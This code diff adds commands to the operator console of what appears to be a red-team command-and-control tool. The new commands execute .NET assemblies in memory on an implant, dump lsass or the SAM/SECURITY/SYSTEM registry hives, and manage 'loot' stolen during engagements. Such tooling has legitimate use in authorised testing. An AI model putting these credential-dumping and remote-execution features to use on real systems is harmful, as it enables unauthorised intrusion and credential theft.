@@ -300,6 +300,45 @@ func main() {
 			}
 			cmdTask(client, activeSession.ID, "credential_read", args[0])
 
+		case "assembly":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: assembly <local-dll-or-exe> [args...]")
+				continue
+			}
+			data, err := os.ReadFile(args[0])
+			if err != nil {
+				printError(fmt.Sprintf("Failed to read assembly: %v", err))
+				continue
+			}
+			req := map[string]any{"assembly": base64.StdEncoding.EncodeToString(data)}
+			if len(args) > 1 {
+				req["arguments"] = args[1:]
+			}
+			payload, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, "execute_assembly", string(payload))
+
+		case "loot":
+			if len(args) < 1 {
+				printError("Usage: loot <list|add|get|download|rm> [args]")
+				continue
+			}
+			cmdLoot(client, args)
+
+		case "dump":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: dump <lsass|sam|security|system>")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "credential_dump", args[0])
+
 		case "tokens":
 			if activeSession == nil {
 				printError("No active session. Use 'use <id>' first.")
@@ -535,6 +574,9 @@ func printHelp() {
 		{"getprivs", "List the implant's privileges (Windows) or capabilities (Linux)"},
 		{"creds", "Enumerate credential-bearing files and environment variables (gated)"},
 		{"credread <path>", "Read one credential file named by the operator (gated)"},
+		{"dump <kind>", "Dump lsass or a SAM/SECURITY/SYSTEM hive on Windows (gated)"},
+		{"loot list|add <task>|get <id>|download <id>|rm <id>", "Manage engagement loot on the server"},
+		{"assembly <file> [args...]", "Load a .NET assembly in PowerShell on Windows"},
 		{"tokens", "List the current and stored tokens"},
 		{"steal <pid>", "Duplicate a process token and store it"},
 		{"maketoken <user> <pass> [domain]", "Log on with credentials and store the token"},
@@ -762,6 +804,112 @@ func isTaskPending(result *TaskResult) bool {
 }
 
 // cmdTask submits a task and polls until completion, then renders its output.
+// LootArtifact mirrors the server's metadata response (the blob path is not
+// serialized).
+type LootArtifact struct {
+	ID           string `json:"id"`
+	EngagementID string `json:"engagement_id"`
+	SessionID    string `json:"session_id,omitempty"`
+	TaskID       string `json:"task_id,omitempty"`
+	Operator     string `json:"operator"`
+	Kind         string `json:"kind"`
+	Name         string `json:"name"`
+	Size         int64  `json:"size"`
+	SHA256       string `json:"sha256"`
+	Note         string `json:"note,omitempty"`
+	CreatedAt    string `json:"created_at"`
+}
+
+func cmdLoot(client *api.Client, args []string) {
+	switch args[0] {
+	case "list", "ls":
+		var artifacts []LootArtifact
+		if err := client.Get("/api/loot", &artifacts); err != nil {
+			printError(fmt.Sprintf("Failed to list loot: %v", err))
+			return
+		}
+		if len(artifacts) == 0 {
+			printInfo("No loot stored.")
+			return
+		}
+		fmt.Printf("%-38s %-12s %-24s %10s  %s\n", "ID", "KIND", "NAME", "SIZE", "SHA256")
+		for _, a := range artifacts {
+			fmt.Printf("%-38s %-12s %-24s %10d  %.12s\n", a.ID, a.Kind, a.Name, a.Size, a.SHA256)
+		}
+
+	case "add":
+		if len(args) < 2 {
+			printError("Usage: loot add <task-id> [name]")
+			return
+		}
+		body := map[string]string{"task_id": args[1], "kind": "task"}
+		if len(args) >= 3 {
+			body["name"] = args[2]
+		}
+		var artifact LootArtifact
+		if err := client.Post("/api/loot", body, &artifact); err != nil {
+			printError(fmt.Sprintf("Failed to store loot: %v", err))
+			return
+		}
+		printInfo(fmt.Sprintf("Stored loot %s (%s, %d bytes)", artifact.ID, artifact.Name, artifact.Size))
+
+	case "get":
+		if len(args) < 2 {
+			printError("Usage: loot get <id>")
+			return
+		}
+		var artifact LootArtifact
+		if err := client.Get("/api/loot/"+args[1], &artifact); err != nil {
+			printError(fmt.Sprintf("Failed to get loot: %v", err))
+			return
+		}
+		data, _ := json.MarshalIndent(artifact, "", "  ")
+		fmt.Println(string(data))
+
+	case "download":
+		if len(args) < 2 {
+			printError("Usage: loot download <id> [local-path]")
+			return
+		}
+		dest := ""
+		if len(args) >= 3 {
+			dest = args[2]
+		} else {
+			var artifact LootArtifact
+			if err := client.Get("/api/loot/"+args[1], &artifact); err == nil {
+				dest = artifact.Name
+			}
+			if dest == "" || dest == "." {
+				dest = args[1] + ".bin"
+			}
+		}
+		data, err := client.GetBytes("/api/loot/" + args[1] + "/download")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to download loot: %v", err))
+			return
+		}
+		if err := os.WriteFile(dest, data, 0600); err != nil {
+			printError(fmt.Sprintf("Failed to write %s: %v", dest, err))
+			return
+		}
+		printInfo(fmt.Sprintf("Wrote %d bytes to %s", len(data), dest))
+
+	case "rm", "delete":
+		if len(args) < 2 {
+			printError("Usage: loot rm <id>")
+			return
+		}
+		if err := client.Delete("/api/loot/"+args[1], nil); err != nil {
+			printError(fmt.Sprintf("Failed to delete loot: %v", err))
+			return
+		}
+		printInfo("Loot deleted.")
+
+	default:
+		printError("Usage: loot <list|add|get|download|rm> [args]")
+	}
+}
+
 func cmdTask(client *api.Client, sessionID string, taskType string, taskArgs string) {
 	result, ok := submitAndPoll(client, sessionID, taskType, taskArgs)
 	if !ok {
